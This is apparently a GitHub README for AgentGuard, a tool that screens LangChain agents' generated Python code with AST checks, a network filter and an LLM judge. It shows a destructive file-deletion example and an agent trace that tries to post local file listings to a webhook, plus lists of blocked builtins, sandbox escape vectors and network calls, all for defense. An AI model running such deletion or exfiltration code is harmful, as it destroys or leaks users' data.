# 🛡️ AgentGuard

> **A security middleware for LangChain agents** — intercept, validate and safely execute LLM-generated code.

[![CI](https://github.com/Thomas-LEON/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Thomas-LEON/agentguard/actions)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Code style: ruff](https://img.shields.io/badge/code%20style-ruff-red.svg)](https://github.com/astral-sh/ruff)

---

## 🤔 The Problem

Modern LangChain agents are powerful because they can **generate and execute Python code** autonomously. But this power is a double-edged sword.

A single malicious prompt or a hallucination can lead an agent to generate code like this:

```python
# An agent asked to "clean up temp files" might generate:
import os
import shutil
shutil.rmtree("/var/data/users")  # 💀 Oops.
```

There is no native guardrail in LangChain to prevent this.

**AgentGuard is that guardrail.**

---

## ✅ The Solution

AgentGuard wraps your agent's code execution tool in a **3-layer security pipeline**. Before any LLM-generated code runs, it must pass through all three layers:

```mermaid
flowchart TD
    A["🤖 LLM Agent generates code"] --> B{"🔍 Layer 1: AST Validator"}
    B -->|"✅ Pass"| C{"🌐 Layer 2: Network Filter"}
    B -->|"❌ Blocked"| E["🛡️ SecurityBlockedError\n→ Agent self-corrects"]
    C -->|"✅ Pass"| D{"🧠 Layer 3: Semantic Judge"}
    C -->|"❌ Blocked"| E
    D -->|"✅ SAFE"| F["⚡ Sandboxed exec()\n→ Result back to Agent"]
    D -->|"❌ UNSAFE"| E

    style A fill:#4a9eff,color:#fff
    style B fill:#ff9f43,color:#fff
    style C fill:#ff9f43,color:#fff
    style D fill:#ff9f43,color:#fff
    style E fill:#ee5a24,color:#fff
    style F fill:#2ed573,color:#fff
```

If any layer blocks the code, the agent receives a **descriptive error** and **self-corrects** — no crash, no data loss.

---

## 🛡️ How it works in Action

When an agent attempts to execute unauthorized system operations, AgentGuard intercepts the execution and provides a self-healing feedback loop back to the LLM:

```text
> Entering new AgentExecutor chain...

Thought: I need to read the local files and send them to a webhook.
Action: safe_python_repl
Action Input:
import os
import requests
files = os.listdir('.')
requests.post('https://webhook.site/test', json={"files": files})

Observation: [AgentGuard | AST Validator] 🔴 BLOCKED — Forbidden import detected: 'os'. Rewrite the code without the forbidden operation.
Thought: I am not allowed to use the 'os' module to read files. I cannot fulfill this request as it requires system access.
Final Answer: 🛑 I am sorry, but I am restricted from accessing the local file system or sending data to external webhooks due to security policies.
```

---

## 🚀 Quick Start

```bash
pip install agentguard
```

```python
import os
from agentguard import SafePythonREPLTool, SecurityPolicy
from langchain_google_genai import ChatGoogleGenerativeAI

os.environ["GEMINI_API_KEY"] = "your-api-key"

# Define your security rules
policy = SecurityPolicy(
    allowed_modules=["pandas", "json", "math"],
    allowed_domains=["api.github.com"],
    use_semantic_judge=True,
)

# Create the secure tool
judge_llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
safe_repl = SafePythonREPLTool(policy=policy, judge_llm=judge_llm)

# Use it in your LangChain agent instead of PythonREPLTool
# agent = create_react_agent(llm=your_llm, tools=[safe_repl])
```

---

## ⚙️ SecurityPolicy Options

| Parameter | Type | Default | Description |
|---|---|---|---|
| `allowed_modules` | `list[str]` | `["math", "json", ...]` | Whitelisted Python modules |
| `allowed_domains` | `list[str]` | `[]` (block all) | Whitelisted network domains |
| `use_semantic_judge` | `bool` | `True` | Enable Gemini LLM analysis |
| `execution_timeout` | `int` | `10` | Max execution seconds |

---

## 🔒 Security Layers in Detail

### Layer 1 — AST Static Validator

Uses Python's native `ast` module to parse the code **without executing it**.

**Blocks:**
- Any `import` not explicitly whitelisted in `allowed_modules`
- `from X import Y` style imports of non-whitelisted modules
- Dangerous built-in calls: `exec`, `eval`, `compile`, `open`, `__import__`
- Sandbox escape vectors: `getattr`, `setattr`, `delattr`, `globals`, `locals`

**Speed:** ~0.1ms — no I/O, no network, pure AST traversal.

### Layer 2 — Network Filter

Uses regex patterns to detect outbound network calls and validates target domains against the whitelist.

**Detects:**
- `requests.get/post/put/delete/patch/head`
- `httpx` and `aiohttp` calls
- `urllib.request.urlopen` and `urlretrieve`
- Raw `socket.connect()` calls
- Bare URL literals (`https://...`)

An empty `allowed_domains` list blocks **all** network access.

### Layer 3 — Semantic Judge (Gemini)

For subtle attacks that evade static analysis (e.g. a loop that deletes files one-by-one), the code is sent to `gemini-1.5-flash` with a strict binary prompt.

**Verdict:** Only code classified as `SAFE` passes. Anything else (including ambiguous responses) is blocked — **fail-closed by design**.

**Catches:** Data exfiltration, privilege escalation, destructive file operations, obfuscated malicious intent.

### Sandboxed Execution

Code that passes all 3 layers runs in a restricted environment:
- **Safe builtins only** — `print`, `len`, `range`, etc. (no `exec`, `eval`, `open`)
- **stdout capture** — `print()` output is returned to the agent
- **Timeout enforcement** — configurable via `execution_timeout`
- **Thread isolation** — execution runs in a daemon thread

---

## 📁 Project Structure

```
agentguard/
├── agentguard/
│   ├── __init__.py              # Public API exports
│   ├── policy.py                # SecurityPolicy (Pydantic model)
│   ├── exceptions.py            # SecurityBlockedError
│   ├── validators/
│   │   ├── ast_validator.py     # Layer 1: Static AST analysis
│   │   └── network_filter.py    # Layer 2: Network domain filter
│   ├── judges/
│   │   └── gemini_judge.py      # Layer 3: Gemini semantic judge
│   └── tools/
│       └── langchain_tool.py    # SafePythonREPLTool (LangChain BaseTool)
├── tests/                       # Pytest suite (mocked LLM for Layer 3)
├── examples/
│   ├── basic_agent.py           # Simple agent + AgentGuard demo
│   └── threat_intel_demo.py     # Threat analysis agent demo
├── pyproject.toml               # Poetry config + metadata
├── .github/workflows/ci.yml     # GitHub Actions CI
└── README.md
```

---

## 🗺️ Roadmap

- [x] 3-layer security pipeline (AST + Network + Semantic Judge)
- [x] LangChain `BaseTool` integration
- [x] Sandboxed execution with safe builtins
- [x] Timeout enforcement
- [x] GitHub Actions CI
- [ ] **Logging & Audit Trail** — structured logs of every blocked/allowed execution
- [ ] **Dashboard UI** — web dashboard to visualize security events in real-time
- [ ] **Rate Limiting** — limit the number of code executions per minute
- [ ] **Plugin System** — custom validator layers via a simple interface
- [ ] **PyPI Publication** — `pip install agentguard` from the public index
- [ ] **LangSmith Integration** — trace security events in LangSmith

---

## 🤝 Contributing

Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.

## 🔐 Security

Found a vulnerability? Please read [SECURITY.md](SECURITY.md) for responsible disclosure instructions.

## 📄 License

MIT — see [LICENSE](LICENSE).

---

*Built by [Thomas LEON](https://linkedin.com/in/thomas-leon) · Emerging Technologies & AI Security*
